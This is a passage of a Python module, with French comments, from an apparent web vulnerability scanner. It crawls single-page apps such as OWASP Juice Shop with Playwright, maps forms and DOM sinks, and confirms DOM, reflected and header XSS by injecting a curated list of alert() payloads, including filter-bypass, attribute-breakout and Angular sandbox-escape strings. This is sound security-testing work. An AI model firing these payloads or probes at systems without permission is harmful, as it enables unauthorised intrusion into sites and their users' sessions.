"""
crawler.py  (core/crawler.py)
=============================
Crawler JS-aware basé sur **Playwright**.

Rôle dans le pipeline :
    1. Ouvrir la cible dans un navigateur Chromium headless (rendu réel du JS,
       indispensable pour les SPA type OWASP Juice Shop / Angular).
    2. Découvrir récursivement les URLs internes (liens <a>, navigations JS).
    3. Extraire les formulaires et leurs champs (points d'injection potentiels).
    4. Détecter des indices de **sinks DOM-XSS** (innerHTML, document.write,
       eval, location.hash, etc.) présents dans le HTML/JS rendu.
    5. Sonder activement le DOM-XSS côté client (voir _probe_dom_xss) : sur
       une SPA, XSStrike/DalFox ne voient que la réponse HTTP brute et ratent
       les vulnérabilités où le framework (Angular/React) injecte lui-même
       le payload dans le DOM sans échappement. Le crawler teste directement
       dans le navigateur et ne retient une trouvaille que si un dialogue JS
       s'est réellement déclenché (preuve d'exécution, pas une heuristique).

Le crawler cartographie la surface d'attaque pour les scanners DAST
(XSStrike / DalFox), ET confirme lui-même les DOM-XSS qu'eux seuls ne
peuvent pas détecter depuis l'extérieur du navigateur.

Sortie : un objet `CrawlResult` sérialisable (dataclass -> dict).
"""

from __future__ import annotations

import asyncio
import base64
import logging
import re
import threading
import time
import uuid
from dataclasses import dataclass, field, asdict
from typing import Any
from urllib.parse import urljoin, urlparse, urldefrag, quote

from playwright.async_api import async_playwright, Page, TimeoutError as PWTimeout

import config

logger = logging.getLogger("crawler")


# --------------------------------------------------------------------------
# Modèles de données
# --------------------------------------------------------------------------
@dataclass
class FormField:
    name: str
    type: str = "text"


@dataclass
class DiscoveredForm:
    """Un formulaire HTML découvert = point d'injection candidat."""
    action: str                       # URL cible du formulaire (absolue)
    method: str = "get"               # get / post
    fields: list[FormField] = field(default_factory=list)
    source_page: str = ""             # page où le formulaire a été trouvé


@dataclass
class DomSink:
    """Indice de sink DOM-XSS repéré dans le HTML/JS rendu."""
    page: str
    pattern: str                      # ex : "innerHTML", "document.write"
    snippet: str                      # extrait de code autour du match


@dataclass
class CrawlResult:
    target: str
    urls: list[str] = field(default_factory=list)          # pages découvertes
    injectable_urls: list[str] = field(default_factory=list)  # URLs avec params
    forms: list[DiscoveredForm] = field(default_factory=list)
    dom_sinks: list[DomSink] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)
    # Vulnérabilités DOM-XSS confirmées PAR EXÉCUTION RÉELLE pendant le crawl
    # (voir _probe_dom_xss) : ce ne sont pas des candidats à re-tester, mais
    # déjà des preuves (payload exécuté + capture d'écran).
    dom_xss_findings: list[dict[str, Any]] = field(default_factory=list)
    # Jeton de session du compte jetable créé par _register_and_login(), si
    # l'authentification a réussi. Permet à scanner_manager.py de lancer des
    # scans DAST authentifiés (ex : DalFox en POST sur un formulaire qui
    # exige une session) sur des pages sinon inaccessibles anonymement.
    auth_token: str = ""
    # Audit de sécurité de la session établie (voir _analyze_session) :
    # attributs des cookies (HttpOnly/Secure/SameSite), jeton exposé en
    # localStorage... Distinct des vulnérabilités XSS : ce n'est pas une
    # injection trouvée, mais ce qui détermine l'IMPACT d'un XSS trouvé
    # ailleurs (un cookie de session sans HttpOnly, ou un jeton en
    # localStorage, transforme n'importe quel XSS en vol de session trivial).
    session_analysis: dict[str, Any] = field(default_factory=dict)
    # Audit des en-têtes de sécurité HTTP (CSP, X-Frame-Options, HSTS...)
    # de la réponse principale — voir _analyze_security_headers. Distinct
    # des vulnérabilités XSS : détermine si le navigateur a un filet de
    # sécurité (CSP notamment) même si une injection XSS est trouvée.
    security_headers: dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        return asdict(self)


# --------------------------------------------------------------------------
# Motifs de détection de sinks DOM-XSS (heuristique, non exhaustive)
# --------------------------------------------------------------------------
DOM_SINK_PATTERNS = [
    r"\.innerHTML\s*=",
    r"\.outerHTML\s*=",
    r"document\.write\s*\(",
    r"document\.writeln\s*\(",
    r"\.insertAdjacentHTML\s*\(",
    r"eval\s*\(",
    r"setTimeout\s*\(\s*['\"]",
    r"setInterval\s*\(\s*['\"]",
    r"location\.hash",
    r"location\.search",
    r"\$\(.*\)\.html\s*\(",          # jQuery .html()
]
_SINK_REGEX = re.compile("|".join(DOM_SINK_PATTERNS))


# --------------------------------------------------------------------------
# Bruit réseau à exclure des URLs "injectables" capturées passivement
# --------------------------------------------------------------------------
# Le protocole de handshake Socket.IO/Engine.IO régénère une URL différente
# (paramètre `t` = timestamp) à chaque poll, plusieurs fois par seconde tant
# que la page reste ouverte. Sans ce filtre, ce bruit noie les vraies URLs
# d'API (ex: /rest/products/search?q=...) dans la limite `max_urls`.
# "api/challenges" est un endpoint interne de suivi de progression (Juice
# Shop), pas une fonctionnalité utilisateur : le fuzzer avec des payloads
# XSS y provoque un crash mémoire (heap OOM) côté Node sans révéler de
# vulnérabilité exploitable côté client — on l'exclut donc du scan.
_NOISE_PATH_RE = re.compile(
    r"socket\.io|/__webpack|hot-update|api/challenges", re.IGNORECASE
)
_STATIC_EXT_RE = re.compile(
    r"\.(js|css|map|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|mp4|webm|json)(\?|$)",
    re.IGNORECASE,
)


# --------------------------------------------------------------------------
# Sondage DOM-XSS actif
# --------------------------------------------------------------------------
# XSStrike/DalFox testent la réponse HTTP brute : sur une SPA Angular/React
# comme Juice Shop, le XSS réel se produit côté client (le JSON de l'API est
# injecté sans échappement dans le DOM par le framework), invisible dans la
# réponse HTTP elle-même. On teste donc directement dans un vrai navigateur
# avec une petite liste de payloads connus pour contourner l'assainissement
# Angular usuel, et on ne considère la vulnérabilité confirmée QUE si une
# boîte de dialogue JS (alert/confirm/prompt) se déclenche réellement.
# Liste élargie, curatée à partir de PayloadBox (payload-box/xss-payload-list
# sur GitHub — Basic/event-handlers.txt, Basic/script-tags.txt et
# Frameworks/angularjs.txt, adaptée pour Juice Shop). Volontairement bornée à
# ~20 entrées plutôt que les milliers du dépôt complet : chaque payload coûte
# une interaction navigateur réelle (remplissage + attente), donc un corpus
# trop large rendrait le crawl impraticable. Diversité recherchée : tags de
# base, gestionnaires d'évènement qui se déclenchent SANS interaction
# supplémentaire (onerror/onload/onanimationend/onstart), variantes de casse
# (contournement de filtre), échappement d'attribut, et payloads spécifiques
# au framework Angular de la cible.
DOM_XSS_PAYLOADS = [
    # Tags de base
    '<script>alert(`xss-poc`)</script>',
    '<ScRiPt>alert(`xss-poc`)</sCrIpT>',
    '<img src=x onerror=alert(`xss-poc`)>',
    '<svg onload=alert(`xss-poc`)>',
    '<iframe src="javascript:alert(`xss-poc`)">',
    # Gestionnaires d'évènement auto-déclenchés (pas besoin de clic/focus)
    '<body onload=alert(`xss-poc`)>',
    '<iframe onload=alert(`xss-poc`)></iframe>',
    '<video src=x onerror=alert(`xss-poc`)></video>',
    '<audio src=x onerror=alert(`xss-poc`)></audio>',
    '<marquee onstart=alert(`xss-poc`)>x</marquee>',
    '<style>@keyframes x{}</style><xss style="animation-name:x" '
    'onanimationend=alert(`xss-poc`)></xss>',
    # Échappement d'attribut (payload qui casse hors d'un attribut existant)
    '"><script>alert(`xss-poc`)</script>',
    "'><svg onload=alert(`xss-poc`)>",
    # Contournement d'encodage / obfuscation basique
    '<script>eval(atob("YWxlcnQoYHhzcy1wb2NgKQ=="))</script>',
    '<script>setTimeout(function(){alert(`xss-poc`)},50)</script>',
    # Ciblé Angular (Juice Shop) : tentatives d'évasion de sandbox de template
    "{{constructor.constructor('alert(`xss-poc`)')()}}",
    "<div ng-app ng-csp>{{x=1;x.toString.constructor('alert(`xss-poc`)')()}}</div>",
    # Champs texte : déclencheurs liés à la frappe/au focus (utile puisque
    # `_probe_dom_xss` remplit puis appuie sur Entrée sur le même champ)
    '<input onfocus=alert(`xss-poc`) autofocus>',
    '<textarea oninput=alert(`xss-poc`)>x</textarea>',
    # Payload spécifique attendu par le easter-egg "Bonus Payload" de Juice
    # Shop (défi xssBonusChallenge) : un embed vidéo précis, reconnu
    # côté serveur. Les payloads génériques ci-dessus ne le déclenchent pas.
    '<iframe width="100%" height="166" scrolling="no" frameborder="no" '
    'allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//'
    'api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&'
    'hide_related=false&show_comments=true&show_user=true&show_reposts=false&'
    'show_teaser=true"></iframe><script>alert(`xss-poc`)</script>',
    # Évasion de contexte JS-string (payload atterrissant à l'intérieur
    # d'une chaîne JS déjà entre guillemets, ex : var q = "REFLECTED";).
    "';alert(`xss-poc`);//",
    '";alert(`xss-poc`);//',
    "</script><script>alert(`xss-poc`)</script>",
    # Contexte URL (atterrit dans un attribut href/src déjà entre guillemets,
    # sans échappement de balise nécessaire).
    "javascript:alert(`xss-poc`)",
    # Injection d'attribut SANS échappement de guillemet (cas où la valeur
    # atterrit non échappée dans un attribut non fermé/mal filtré).
    'onmouseover=alert(`xss-poc`) autofocus x=',
]

# --------------------------------------------------------------------------
# Sous-ensembles de DOM_XSS_PAYLOADS les plus efficaces selon le contexte de
# réflexion détecté par `_detect_reflection_context` (marqueur unique
# injecté puis localisé dans le HTML rendu). Utilisés pour RÉORDONNER le
# corpus avant de le tester — jamais pour le réduire : le budget complet
# reste tenté dans tous les cas, seul l'ordre change (les payloads les plus
# probables d'après le contexte passent en premier, ce qui confirme une
# vulnérabilité plus tôt dans le budget au lieu de tester des payloads hors
# contexte avant d'arriver aux bons).
PAYLOAD_CONTEXTS: dict[str, list[str]] = {
    "html": [
        p for p in DOM_XSS_PAYLOADS
        if p.lstrip().startswith("<") and not p.lstrip().startswith(("\"", "'"))
    ],
    "attribute": [
        '"><script>alert(`xss-poc`)</script>',
        "'><svg onload=alert(`xss-poc`)>",
        'onmouseover=alert(`xss-poc`) autofocus x=',
        '<img src=x onerror=alert(`xss-poc`)>',
    ],
    "script": [
        "';alert(`xss-poc`);//",
        '";alert(`xss-poc`);//',
        "</script><script>alert(`xss-poc`)</script>",
    ],
    "url": [
        "javascript:alert(`xss-poc`)",
        '<iframe src="javascript:alert(`xss-poc`)">',
    ],
}


def _ordered_payloads_for_context(context: str) -> list[str]:
    """
    Renvoie DOM_XSS_PAYLOADS réordonné : les payloads adaptés au contexte de
    réflexion détecté en premier, suivis du reste du corpus dans son ordre
    d'origine. La couverture ne change pas (aucun payload retiré) — seul
    l'ordre de test change.
    """
    preferred = PAYLOAD_CONTEXTS.get(context, [])
    preferred_set = set(preferred)
    rest = [p for p in DOM_XSS_PAYLOADS if p not in preferred_set]
    return preferred + rest


# Sous-ensemble de DOM_XSS_PAYLOADS utilisable comme valeur d'en-tête HTTP
# (voir _probe_header_xss) : exclut tout payload contenant un retour à la
# ligne (déjà absent du corpus, exclu explicitement par sécurité — un CRLF
# dans une valeur d'en-tête casserait la requête). Borné à un sous-ensemble
# efficace car chaque essai coûte un contexte navigateur complet.
HEADER_XSS_PAYLOADS = [p for p in DOM_XSS_PAYLOADS if "\n" not in p and "\r" not in p][:8]


def _parse_csp(header_value: str) -> dict[str, list[str]]:
    """Parse un en-tête Content-Security-Policy en {directive: [sources]}."""
    directives: dict[str, list[str]] = {}
    for part in header_value.split(";"):
        part = part.strip()
        if not part:
            continue
        tokens = part.split()
        if not tokens:
            continue
        directives[tokens[0].lower()] = tokens[1:]
    return directives


def _names_look_session_like(names: set[str]) -> bool:
    """Un nom de cookie/clé localStorage évoque une session (utilisé comme
    signal de secours par _verify_logged_in_generic quand aucun indice
    textuel de déconnexion n'est trouvé sur la page)."""
    return any(
        kw in name.lower()
        for name in names
        for kw in ("session", "auth", "token", "sid", "jwt")
    )


# Indices textuels/structurels de déconnexion, utilisés par la vérification
# de connexion générique (site quelconque, sans sélecteur fixe connu — voir
# _verify_logged_in_generic). Couvre plusieurs formulations et l'attribut
# href/aria-label en plus du texte visible.
_LOGOUT_HINT_SELECTORS = (
    "a:has-text('Log out')", "a:has-text('Sign out')", "a:has-text('Logout')",
    "a:has-text('Sign Out')", "a:has-text('Log Out')",
    "button:has-text('Log out')", "button:has-text('Sign out')",
    "button:has-text('Logout')",
    # Volontairement PAS de mots seuls trop génériques ("Exit", "Disconnect") :
    # constaté en pratique — le bouton LOGIN de Juice Shop utilise l'icône
    # Material "exit_to_app" (icône générique "porte de sortie", réutilisée
    # pour login ET logout dans Material Design), dont le texte de ligature
    # contient littéralement "exit" et matchait à tort `has-text('Exit')`
    # comme preuve de déconnexion. "Disconnect" a le même risque avec les
    # boutons "Disconnect wallet" des dApps Web3. On ne garde que des
    # expressions complètes (2+ mots) ou des attributs href/aria-label
    # contenant le mot complet "logout"/"sign out", nettement moins ambigus.
    "[href*='logout' i]", "[href*='signout' i]", "[href*='sign-out' i]",
    "[aria-label*='log out' i]", "[aria-label*='sign out' i]",
)

# Segments de chemin (correspondance EXACTE d'un segment entier, pas une
# sous-chaîne) évoquant un endpoint "utilisateur courant" — voir
# _inspect_session_bootstrap_response. Volontairement étroit : des préfixes
# génériques comme "api"/"rest" matcheraient presque tout sur une SPA
# quelconque (constaté sur Juice Shop, voir le commentaire de la méthode).
_SESSION_CHECK_URL_SEGMENTS = {
    "me", "whoami", "who-am-i", "current-user", "currentuser",
    "session", "profile", "account", "userinfo", "user-info",
}

# Bascules de menu compte/avatar courantes : beaucoup de sites cachent leur
# lien "Log out" derrière l'un de ces éléments (menu déroulant à rendu
# paresseux) — voir _verify_logged_in_generic, qui essaie de les ouvrir
# avant d'abandonner. Même principe que le bug corrigé pour Juice Shop
# (voir _verify_logged_in), généralisé à un site quelconque.
_MENU_TOGGLE_SELECTORS = (
    "[aria-label*='account' i]", "[aria-label*='profile' i]",
    "[aria-label*='user menu' i]", "[aria-label*='my account' i]",
    "[class*='avatar' i]", "[class*='user-menu' i]",
    "[class*='account-menu' i]", "[data-testid*='account' i]",
    "[data-testid*='user-menu' i]",
)

# --------------------------------------------------------------------------
# Identifiants d'un compte jetable créé pour explorer les pages nécessitant
# une session (profil, feedback avec auteur pré-rempli, etc.).
# --------------------------------------------------------------------------
def _random_credentials() -> tuple[str, str]:
    import random
    import string

    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"scanner_{suffix}@example.test", f"Sc4nner!{suffix}"


def _short_reason(exc: Exception) -> str:
    """
    Réduit une exception Playwright à sa première ligne : les timeouts
    d'actionabilité embarquent un `Call log` de dizaines de lignes (voir les
    retries de `_try_register_and_login`), illisible et hors-sujet une fois
    affiché dans le rapport utilisateur — on ne garde que le message utile.
    """
    text = str(exc).strip()
    first_line = text.splitlines()[0] if text else type(exc).__name__
    return first_line[:160]


def _parse_cookie_string(raw: str) -> list[tuple[str, str]]:
    """
    Parse un cookie fourni manuellement dans l'UI, format `Cookie:` HTTP
    standard ("name=value; name2=value2") — le format qu'on copie-colle
    directement depuis les devtools du navigateur.
    """
    pairs: list[tuple[str, str]] = []
    for part in raw.split(";"):
        part = part.strip()
        if not part or "=" not in part:
            continue
        name, _, value = part.partition("=")
        name = name.strip()
        if name:
            pairs.append((name, value.strip()))
    return pairs


# Résout une expression arithmétique simple ("7*3-4") comme celles utilisées
# par le CAPTCHA du formulaire de feedback, sans jamais appeler eval() sur du
# texte non maîtrisé (on n'autorise que chiffres/espaces/opérateurs de base).
_CAPTCHA_EXPR_RE = re.compile(r"what is\s*([\d\s+\-*/]+?)\s*\?", re.IGNORECASE)
_SAFE_ARITH_RE = re.compile(r"^[\d\s+\-*/]+$")


def _solve_captcha(text: str) -> str | None:
    m = _CAPTCHA_EXPR_RE.search(text)
    if not m:
        return None
    expr = m.group(1).strip()
    if not _SAFE_ARITH_RE.match(expr):
        return None
    try:
        import ast

        tree = ast.parse(expr, mode="eval")
        for node in ast.walk(tree):
            if not isinstance(
                node,
                (ast.Expression, ast.BinOp, ast.Add, ast.Sub, ast.Mult,
                 ast.Div, ast.Constant, ast.USub, ast.UAdd),
            ):
                return None
        return str(int(eval(compile(tree, "<captcha>", "eval"))))
    except Exception:
        return None


# --------------------------------------------------------------------------
# Identification best-effort du sink DOM-XSS déclenché (voir _record_finding)
# --------------------------------------------------------------------------
_SINK_LABELS = {
    r"\.innerHTML\s*=": "innerHTML (direct assignment)",
    r"\.outerHTML\s*=": "outerHTML (direct assignment)",
    r"document\.write\s*\(": "document.write()",
    r"document\.writeln\s*\(": "document.writeln()",
    r"\.insertAdjacentHTML\s*\(": "insertAdjacentHTML()",
    r"eval\s*\(": "eval()",
    r"setTimeout\s*\(\s*['\"]": "setTimeout() with a code string",
    r"setInterval\s*\(\s*['\"]": "setInterval() with a code string",
    r"location\.hash": "location.hash",
    r"location\.search": "location.search",
    r"\$\(.*\)\.html\s*\(": "jQuery .html()",
}

# Default sink per vector, used when no `DOM_SINK_PATTERNS` pattern is found
# literally in the rendered HTML (common with Angular: the framework compiles
# its `[innerHTML]`/interpolation bindings into code that no longer contains
# the literal "innerHTML" string). Stays honest: describes the probable
# mechanism rather than inventing evidence we don't have.
_DEFAULT_SINK_BY_VECTOR = {
    "DOM XSS": "Implicit DOM sink: SPA template binding (e.g. Angular "
               "[innerHTML] / interpolation) inserting the field value "
               "into the rendered DOM without escaping.",
    "Reflected XSS": "Implicit DOM sink: the Angular route consumes the "
                      "URL parameter and injects it into the rendered DOM "
                      "without escaping on page load.",
    "Persisted XSS": "Implicit DOM sink: the value read back from the "
                      "server is re-injected into the rendered DOM without "
                      "escaping (template displaying the stored data).",
}


async def _identify_sink(page: Page, vuln_type: str) -> str:
    """
    Best-effort : cherche un pattern de sink DOM-XSS connu (voir
    DOM_SINK_PATTERNS) dans le HTML actuellement rendu par le navigateur, au
    moment où l'exécution vient d'être confirmée. Si un pattern littéral est
    retrouvé, on le nomme précisément ; sinon on retombe sur une description
    générique honnête du mécanisme probable (voir _DEFAULT_SINK_BY_VECTOR).
    """
    try:
        content = await page.content()
    except Exception:
        content = ""

    for pattern, label in _SINK_LABELS.items():
        if re.search(pattern, content):
            return label
    return _DEFAULT_SINK_BY_VECTOR.get(vuln_type, "DOM sink not precisely identified.")


# --------------------------------------------------------------------------
# Crawler
# --------------------------------------------------------------------------
class PlaywrightCrawler:
    """
    Crawler asynchrone. Utilisation :

        result = await PlaywrightCrawler(target).run()
    """

    def __init__(
        self,
        target: str,
        max_pages: int | None = None,
        max_depth: int | None = None,
        headless: bool | None = None,
        stop_event: threading.Event | None = None,
        dom_probe_budget: int = 60,
        reflected_probe_budget: int = 30,
        form_probe_budget: int = 30,
        header_probe_budget: int = 12,
        auth_cookie: str | None = None,
        auth_jwt: str | None = None,
        auth_username: str | None = None,
        auth_password: str | None = None,
    ) -> None:
        self.target = target.rstrip("/")
        self.max_pages = max_pages or config.CRAWLER_MAX_PAGES
        self.max_depth = max_depth or config.CRAWLER_MAX_DEPTH
        self.headless = config.CRAWLER_HEADLESS if headless is None else headless
        # Authentification manuelle fournie par l'utilisateur (UI) : permet
        # de scanner avec une VRAIE session/compte plutôt que le compte
        # jetable auto-généré par _register_and_login(). Priorité (voir
        # run()) : cookie/JWT fournis > identifiants fournis > auto.
        self.auth_cookie = auth_cookie or None
        self.auth_jwt = auth_jwt or None
        self.auth_username = auth_username or None
        self.auth_password = auth_password or None
        # Vérifié entre chaque page du BFS (voir run()) : permet au bouton
        # "Pause" de l'UI d'interrompre le crawl avant la page suivante au
        # lieu d'attendre la fin des self.max_pages pages.
        self.stop_event = stop_event

        self.origin = self._origin(self.target)
        self.result = CrawlResult(target=self.target)
        self._visited: set[str] = set()
        self._seen_form_sigs: set[str] = set()
        # URLs d'API (XHR/fetch) capturées passivement pendant la navigation :
        # sur une SPA (Angular/React), les vrais points d'injection sont des
        # appels REST (ex: /rest/products/search?q=...), pas des <a href>.
        self._captured_api_urls: set[str] = set()
        # État du sondage DOM-XSS actif (voir _probe_dom_xss) : un budget
        # global d'essais pour couvrir plusieurs pages/champs sans spammer
        # la cible ni ralentir excessivement le crawl.
        self._dialog_fired = False
        # Budgets réglés par le niveau de scan choisi dans l'UI (voir
        # config.SCAN_LEVELS) pour couvrir tout ou partie du corpus
        # DOM_XSS_PAYLOADS (~20 payloads) sur plusieurs champs/pages, au lieu
        # de s'arrêter au premier payload qui fonctionne (voir _probe_dom_xss
        # /_probe_reflected_xss/_probe_persisted_forms).
        self._dom_probe_budget = dom_probe_budget
        self._form_probe_budget = form_probe_budget
        self._reflected_probe_budget = reflected_probe_budget
        # Sondage XSS via en-têtes HTTP réfléchis (voir _probe_header_xss) :
        # budget séparé car chaque essai ouvre un nouveau contexte navigateur
        # (coûteux), contrairement aux sondages ci-dessus qui réutilisent la
        # même page.
        self._header_probe_budget = header_probe_budget
        # Ne vérifier les en-têtes de sécurité (CSP...) qu'une fois, sur la
        # toute première page — ils sont généralement identiques sur tout le
        # site (même serveur/configuration), pas besoin de le refaire à
        # chaque page (voir run()).
        self._headers_checked = False
        # Compte jetable créé via _register_and_login() : de nombreuses pages
        # (profil, feedback avec auteur pré-rempli, menu compte...) ne sont
        # accessibles/pertinentes qu'après authentification et sont sinon
        # invisibles au crawler.
        self._login_email, self._login_password = _random_credentials()
        self._logged_in = False
        self._finding_keys: set[tuple[str, str, str, str]] = set()

    def _paused(self) -> bool:
        """Pause demandée par l'utilisateur (voir stop_event) : vérifié dans
        les boucles à budget (_probe_dom_xss/_probe_reflected_xss/
        _probe_persisted_forms) et le retry de login, en plus de la boucle
        BFS de run() — une seule page peut sinon consommer plus d'une minute
        de sondage avant que la pause ne soit honorée."""
        return bool(self.stop_event and self.stop_event.is_set())

    async def _on_dialog(self, dialog) -> None:
        """Capture le déclenchement d'un dialogue JS (preuve d'exécution XSS)."""
        self._dialog_fired = True
        try:
            await dialog.dismiss()
        except Exception:
            pass

    # ---- Helpers -------------------------------------------------------
    @staticmethod
    def _origin(url: str) -> str:
        p = urlparse(url)
        return f"{p.scheme}://{p.netloc}"

    def _same_origin(self, url: str) -> bool:
        return self._origin(url) == self.origin

    @staticmethod
    def _normalize(url: str) -> str:
        """
        Retire le fragment (#...) SAUF s'il s'agit d'une route Angular
        (ex: "#/login", "#/search?q=..."). Juice Shop (et la plupart des SPA
        Angular) utilise le hash comme routeur côté client : chaque page de
        l'appli vit derrière un fragment de la forme "#/route". Un simple
        `urldefrag()` les réduit TOUTES à l'URL de base ("http://host/"),
        déjà visitée -> elles ne sont jamais mises en file d'attente et
        l'essentiel du site (login, contact, profil, recherche...) reste
        invisible au crawler. On ne strip que les fragments qui ne
        ressemblent PAS à une route (ex: ancre "#top").
        """
        base, frag = urldefrag(url)
        if frag.startswith("/"):
            return f"{base}#{frag}"
        return base

    # ---- Extraction d'une page ----------------------------------------
    async def _extract_links(self, page: Page, base_url: str) -> list[str]:
        try:
            hrefs = await page.eval_on_selector_all(
                "a[href]", "els => els.map(e => e.getAttribute('href'))"
            )
        except Exception:
            hrefs = []

        links: list[str] = []
        for href in hrefs:
            if not href or href.startswith(("mailto:", "tel:", "javascript:")):
                continue
            absolute = self._normalize(urljoin(base_url, href))
            if config.CRAWLER_SAME_ORIGIN_ONLY and not self._same_origin(absolute):
                continue
            if _NOISE_PATH_RE.search(urlparse(absolute).path):
                continue
            links.append(absolute)
        return links

    async def _extract_forms(self, page: Page, base_url: str) -> list[DiscoveredForm]:
        try:
            raw_forms = await page.evaluate(
                """() => Array.from(document.querySelectorAll('form')).map(f => ({
                        action: f.getAttribute('action') || '',
                        method: (f.getAttribute('method') || 'get').toLowerCase(),
                        fields: Array.from(
                            f.querySelectorAll('input, textarea, select')
                        ).map(i => ({
                            name: i.getAttribute('name') || i.getAttribute('formControlName')
                                  || i.getAttribute('id') || '',
                            type: i.getAttribute('type') || i.tagName.toLowerCase()
                        }))
                }))"""
            )
        except Exception as exc:  # pragma: no cover - robustesse
            logger.debug("Extraction des formulaires impossible sur %s : %s", base_url, exc)
            return []

        forms: list[DiscoveredForm] = []
        for rf in raw_forms:
            action = self._normalize(urljoin(base_url, rf.get("action") or base_url))
            fields = [
                FormField(name=f["name"], type=f.get("type", "text"))
                for f in rf.get("fields", [])
                if f.get("name")
            ]
            if not fields:
                continue
            # Signature pour dédupliquer les formulaires identiques.
            sig = f"{rf.get('method')}|{action}|{','.join(sorted(f.name for f in fields))}"
            if sig in self._seen_form_sigs:
                continue
            self._seen_form_sigs.add(sig)
            forms.append(
                DiscoveredForm(
                    action=action,
                    method=rf.get("method", "get"),
                    fields=fields,
                    source_page=base_url,
                )
            )
        return forms

    def _on_request(self, request) -> None:
        """
        Écouteur passif des requêtes réseau (XHR/fetch inclus).

        Sur une SPA, la recherche/les filtres passent par des appels GET vers
        une API REST (ex : /rest/products/search?q=xss) plutôt que par des
        liens <a href> classiques. On capture ces URLs paramétrées pour les
        proposer comme cibles aux scanners DAST.
        """
        try:
            if request.method != "GET":
                return
            url = request.url
            if not urlparse(url).query:
                return
            if config.CRAWLER_SAME_ORIGIN_ONLY and not self._same_origin(url):
                return
            path = urlparse(url).path
            if _NOISE_PATH_RE.search(path) or _STATIC_EXT_RE.search(path):
                return
            self._captured_api_urls.add(self._normalize(url))
        except Exception:
            pass

    async def _dismiss_overlays(self, page: Page) -> None:
        """
        Ferme les overlays modaux affichés au premier chargement (bannière de
        bienvenue Juice Shop, consentement cookies, etc.).

        Tant qu'un `cdk-overlay-backdrop` (Angular Material) est présent, TOUT
        clic ailleurs sur la page — y compris sur l'icône de recherche — est
        intercepté et échoue silencieusement. Sans ce nettoyage, la barre de
        recherche ne s'ouvre jamais et aucun payload ne peut y être testé.
        """
        selectors = (
            "button[aria-label='Close Welcome Banner']",
            "#welcomeBanner__close",
            ".cc-dismiss",
            "button[aria-label*='dismiss cookie' i]",
        )
        for sel in selectors:
            try:
                el = await page.query_selector(sel)
                if el:
                    await el.click(timeout=1000)
                    await page.wait_for_timeout(200)
            except Exception:
                continue

        # Filet de sécurité : tout backdrop restant se ferme généralement
        # avec Echap (comportement standard Angular Material CDK overlay).
        try:
            if await page.query_selector(".cdk-overlay-backdrop"):
                await page.keyboard.press("Escape")
                await page.wait_for_timeout(200)
        except Exception:
            pass

    async def _goto_resilient(self, page: Page, url: str) -> None:
        """`page.goto` avec repli domcontentloaded si networkidle expire
        (fréquent sur les SPA qui pollent en continu, ex : Socket.IO)."""
        try:
            await page.goto(url, timeout=config.CRAWLER_PAGE_TIMEOUT_MS, wait_until="networkidle")
        except PWTimeout:
            await page.goto(url, timeout=config.CRAWLER_PAGE_TIMEOUT_MS, wait_until="domcontentloaded")

    async def _verify_logged_in(self, page: Page, timeout: int = 5000) -> bool:
        """
        Preuve fiable d'une session authentifiée active.

        `#navbarLogoutButton` n'existe dans le DOM qu'une fois le menu
        compte ouvert (mat-menu à rendu paresseux : son contenu n'est monté
        qu'à l'ouverture), ET seulement si une session est active. Le bouton
        bascule du menu (aria-label="Show/hide account menu"), lui, est
        TOUJOURS présent — connecté ou non — et donnerait un FAUX POSITIF
        s'il était utilisé seul comme preuve de connexion (bug constaté :
        un login avec un mauvais mot de passe se rapportait "connecté").
        """
        try:
            toggle = await page.query_selector(
                "button[aria-label='Show/hide account menu']"
            )
            if toggle:
                await toggle.click(timeout=2000, force=True)
                await page.wait_for_timeout(300)
            await page.wait_for_selector("#navbarLogoutButton", timeout=timeout)
            return True
        except Exception:
            return False
        finally:
            # Referme le menu qu'on vient d'ouvrir : le laisser ouvert
            # gênerait les interactions de la page suivante (le backdrop du
            # dropdown intercepterait leurs clics, même après un changement
            # de route Angular côté client).
            try:
                await page.keyboard.press("Escape")
                await page.wait_for_timeout(150)
            except Exception:
                pass

    async def _has_logout_hint(self, page: Page) -> bool:
        """Cherche un indice textuel/structurel de déconnexion (voir
        _verify_logged_in_generic) — factorisé pour être réessayé après
        avoir ouvert un menu compte/avatar potentiellement caché."""
        for sel in _LOGOUT_HINT_SELECTORS:
            try:
                if await page.query_selector(sel):
                    return True
            except Exception:
                continue
        return False

    async def _verify_logged_in_generic(
        self, page: Page, timeout: int = 5000,
        cookies_before: set[str] | None = None,
        storage_before: set[str] | None = None,
    ) -> bool:
        """
        Heuristique de connexion générique, pour un site quelconque où
        `#navbarLogoutButton` (spécifique Juice Shop) n'existe pas. Moins
        fiable que `_verify_logged_in` — best-effort, toujours accompagné
        d'une note explicite dans le rapport en cas d'échec (voir
        _try_login_generic / _apply_manual_session).

        Quatre signaux combinés, aucun n'étant fiable seul sur un site
        quelconque :
          1. Le champ mot de passe a disparu (navigation hors du formulaire).
          2. Un indice de déconnexion est visible ("Log out" et variantes) —
             y compris en essayant d'ouvrir un menu compte/avatar d'abord,
             car beaucoup de sites le cachent dans un menu déroulant à rendu
             paresseux (même piège que Juice Shop, voir _verify_logged_in :
             c'est précisément le bug corrigé là-bas).
          3. (si `cookies_before` fourni) Un NOUVEAU cookie au nom évocateur
             d'une session (session/auth/token/sid/jwt) est apparu depuis.
          4. (si `storage_before` fourni) Une NOUVELLE clé localStorage au
             nom évocateur d'un jeton est apparue — le schéma exact de ce
             framework (JWT en localStorage plutôt qu'en cookie, voir
             _analyze_session) est extrêmement répandu sur les SPA
             modernes (React/Vue/Angular), pas seulement Juice Shop.
        """
        deadline = time.monotonic() + timeout / 1000
        menu_tried = False
        while time.monotonic() < deadline:
            pwd_gone = (await page.query_selector("input[type='password']")) is None
            logout_hint = await self._has_logout_hint(page)

            if not logout_hint and not menu_tried:
                # Une seule tentative d'ouverture de menu (pas à chaque
                # itération de la boucle) pour ne pas s'acharner dessus.
                menu_tried = True
                for sel in _MENU_TOGGLE_SELECTORS:
                    try:
                        el = await page.query_selector(sel)
                        if el and await el.is_visible():
                            await el.click(timeout=1000, force=True)
                            await page.wait_for_timeout(300)
                            if await self._has_logout_hint(page):
                                logout_hint = True
                                break
                    except Exception:
                        continue

            if pwd_gone and logout_hint:
                return True

            # Les signaux cookie/localStorage ci-dessous ne sont PAS
